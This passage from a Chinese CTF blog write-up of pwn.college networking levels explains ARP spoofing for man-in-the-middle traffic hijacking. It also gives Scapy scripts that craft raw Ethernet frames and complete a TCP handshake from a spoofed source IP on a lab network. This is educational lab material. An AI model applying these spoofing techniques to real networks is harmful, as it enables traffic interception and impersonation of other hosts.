<li>如果 <strong>10.0.0.3</strong> 不仅绑定了 <strong>10.0.0.2</strong>，还主动发送伪造的 <strong>ARP 响应</strong>，欺骗其他主机，使得它们的 ARP 表中记录的 <strong>10.0.0.2</strong> 对应的 MAC 地址是 <strong>10.0.0.3</strong> 的 MAC 地址，这种情况将会导致其他主机（包括 <strong>10.0.0.4</strong>）把数据包发送给 <strong>10.0.0.3</strong>。</li>
<li>这种攻击方式叫 <strong>ARP 欺骗</strong>，常见于中间人攻击（MITM）。</li>
</ul>
<h3 id="3-总结数据包发送过程"><a href="#3-总结数据包发送过程" class="headerlink" title="3. 总结数据包发送过程"></a>3. <strong>总结数据包发送过程</strong></h3><p>在你描述的情况下，当 <strong>10.0.0.3</strong> 绑定了 <strong>10.0.0.2</strong>，且 <strong>10.0.0.4</strong> 想与 <strong>10.0.0.2</strong> 建立连接，以下情况可能会发生：</p>
<ul>
<li><strong>如果 10.0.0.3 抢先响应 ARP 请求</strong>，或通过 ARP 欺骗修改了 <strong>10.0.0.4</strong> 的 ARP 表，<strong>10.0.0.4</strong> 会将数据包发送给 <strong>10.0.0.3</strong>。即使数据包的目标 IP 是 <strong>10.0.0.2</strong>，它们会通过 <strong>10.0.0.3</strong> 的 MAC 地址进行传输。</li>
<li><strong>如果没有 ARP 冲突且真正的 10.0.0.2 响应了 ARP 请求</strong>，则 <strong>10.0.0.4</strong> 的数据包会发送给真正的 <strong>10.0.0.2</strong>，不会被 <strong>10.0.0.3</strong> 接收到。</li>
</ul>
<p>因此，<strong>10.0.0.3</strong> 绑定 <strong>10.0.0.2</strong> 后，能否接收到 <strong>10.0.0.4</strong> 发送给 <strong>10.0.0.2</strong> 的数据包，取决于 ARP 表的状态以及 ARP 请求的响应情况。通过 ARP 欺骗，<strong>10.0.0.3</strong> 可以成功劫持流量。</p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> Ether<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> sendp
<span class="token comment"># 构建以太网帧，设置type字段为0xFFFF</span>
eth <span class="token operator">=</span> Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">0xFFFF</span><span class="token punctuation">)</span>
<span class="token comment"># 构建IP层，目标地址为10.0.0.3</span>
ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"10.0.0.3"</span><span class="token punctuation">)</span>
<span class="token comment"># 构建完整的以太网 + IP 报文</span>
packet <span class="token operator">=</span> eth <span class="token operator">/</span> ip
<span class="token comment"># 显示报文结构</span>
packet<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 发送报文</span>
sendp<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>完整的tcp三次握手</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> Ether<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> TCP<span class="token punctuation">,</span> sendp<span class="token punctuation">,</span> send<span class="token punctuation">,</span> sr1
<span class="token comment"># 构建IP层，目标地址为10.0.0.3</span>
ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"10.0.0.3"</span><span class="token punctuation">,</span> src<span class="token operator">=</span><span class="token string">"10.0.0.2"</span><span class="token punctuation">)</span>
tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> dport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> seq<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span>
<span class="token comment"># 构建完整的以太网 + IP 报文</span>
packet <span class="token operator">=</span> ip <span class="token operator">/</span> tcp 
<span class="token comment"># 显示报文结构</span>
packet<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 发送报文</span>
syn_ack <span class="token operator">=</span> sr1<span class="token punctuation">(</span>packet<span class="token punctuation">,</span>iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"syn_ack is :</span><span class="token interpolation"><span class="token punctuation">&#123;</span>syn_ack<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span> <span class="token comment"># 接收的报文flag 为[SA]</span>

tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> dport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> seq<span class="token operator">=</span>syn_ack<span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span>syn_ack<span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">)</span>
<span class="token comment"># 构建完整的以太网 + IP 报文</span>
packet <span class="token operator">=</span> ip <span class="token operator">/</span> tcp 
<span class="token comment"># 显示报文结构</span>
packet<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 发送报文</span>
send<span class="token punctuation">(</span>packet<span class="token punctuation">,</span>iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">美食家李老叭</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://laobameishijia.github.io/2024/09/07/pwn-college-web-4-writeup/">https://laobameishijia.github.io/2024/09/07/pwn-college-web-4-writeup/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">美食家李老叭</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tag/Web/">
                                    <span class="chip bg-color">Web</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/valine/av-min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'q5k1wXexowy7MeNN0CrLYpoK-gzGzoHsz',
        appKey: 'YmFtstASS0GUVRowdQQl4LPb',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/09/12/pwn-college-web-5-writeup/">
                    <div class="card-image">
                        
                        <img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png" class="responsive-img" alt="PWN-College-Web-4-Writeup">
                        
                        <span class="card-title">PWN-College-Web-4-Writeup</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CTF
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-12
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/category/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tag/Web/">
                        <span class="chip bg-color">Web</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/09/04/pwn-college-web-2-writeup/">
                    <div class="card-image">
                        
                        <img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png" class="responsive-img" alt="PWN-College-Web-2-Writeup">
                        
                        <span class="card-title">PWN-College-Web-2-Writeup</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CTF
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-04
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/category/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tag/Web/">
                        <span class="chip bg-color">Web</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021-2025</span>
            
            <span id="year">2021</span>
            <a href="/about" target="_blank">老叭美食家</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">256.3k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
                <span id="sitetime"> Loading ...</span>
                <script>
                    var calcSiteTime = function () {
                        var seconds = 1000;
                        var minutes = seconds * 60;
                        var hours = minutes * 60;
                        var days = hours * 24;
                        var years = days * 365;
                        var today = new Date();
                        var startYear = "2021";
                        var startMonth = "5";
                        var startDate = "21";
                        var startHour = "0";
                        var startMinute = "0";
                        var startSecond = "0";
                        var todayYear = today.getFullYear();
                        var todayMonth = today.getMonth() + 1;
                        var todayDate = today.getDate();
                        var todayHour = today.getHours();
                        var todayMinute = today.getMinutes();
                        var todaySecond = today.getSeconds();
                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                        var diff = t2 - t1;
                        var diffYears = Math.floor(diff / years);
                        var diffDays = Math.floor((diff / days) - diffYears * 365);

                        // 区分是否有年份.
                        var language = 'zh-CN';
                        if (startYear === String(todayYear)) {
                            document.getElementById("year").innerHTML = todayYear;
                            var daysTip = 'This site has been running for ' + diffDays + ' days';
                            if (language === 'zh-CN') {
                                daysTip = '本站已运行 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                daysTip = '本站已運行 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = daysTip;
                        } else {
                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
                                + diffDays + ' days';
                            if (language === 'zh-CN') {
                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
                        }
                    }

                    calcSiteTime();
                </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/laobameishijia" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:994291043@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=994291043" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 994291043" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>
<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
        year - 作为date对象的年份，为4位年份值
        month - 0-11之间的整数，做为date对象的月份
        day - 1-31之间的整数，做为date对象的天数
        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
        minutes - 0-59之间的整数，做为date对象的分钟数
        seconds - 0-59之间的整数，做为date对象的秒数
        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
        var t1 = Date.UTC(2021, 05, 21, 00, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
    siteTime();
</script>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    

</body>

</html>
